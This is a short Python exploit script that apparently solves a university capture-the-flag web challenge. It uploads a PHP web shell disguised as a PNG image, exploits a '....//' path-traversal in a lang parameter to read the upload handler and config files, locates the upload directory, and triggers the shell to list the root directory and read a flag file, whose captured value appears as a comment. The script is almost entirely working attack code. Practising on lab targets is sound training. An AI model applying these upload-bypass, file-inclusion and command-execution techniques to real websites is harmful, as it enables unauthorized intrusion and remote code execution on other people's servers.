import re
import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1501'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

data = {
    'name': 'ctf',
    'email': 'ctf@ctf.com',
    'submit': 'Upload File'
}

file_name = 'shell.php.png'
file_content = b'<?php system("ls /"); system("cat /flag_f1le_l0c4t1on.txt"); ?>'
content_type = 'image/png'
files = {
    'fileToUpload': (file_name, file_content, content_type),
}

print(f"[*] Uploading File: {file_name}")
r1 = requests.post(f'{url}/upload_handler.php', data=data, files=files, cookies=cookies)
print(f"[+] File Upload Response: {r1.text}")

print(f"[*] Reading Upload Handler File")
r2 = requests.get(f'{url}/?lang=....//upload_handler.php', cookies=cookies)
print(f"[+] Raw Response:\n{r2.text}")

matches = re.findall(r"'(.*?)'", r2.text)
config_file = matches[1]
print(f"[+] Receiving Config File: {config_file}")

print(f"[*] Reading Config File: {config_file}")
r3 = requests.get(f'{url}/?lang=....//{config_file}', cookies=cookies)
print(f"[+] Raw Response:\n{r3.text}")

matches = re.findall(r"'(.*?)'", r3.text)
upload_dir = max(matches, key=len)
print(f"[+] Receiving Upload Directory: {upload_dir}")

print(f"[*] Accessing Uploaded File: {file_name}")
r4 = requests.get(f'{url}/{upload_dir}{file_name}', cookies=cookies)
print(f"[+] Uploaded File Access Response:\n{r4.text}")

# flag{Y0u_R_r34lly_g4tt1ng_pr0_4t_h4ck1ng!_6114fc8fe4f41819}
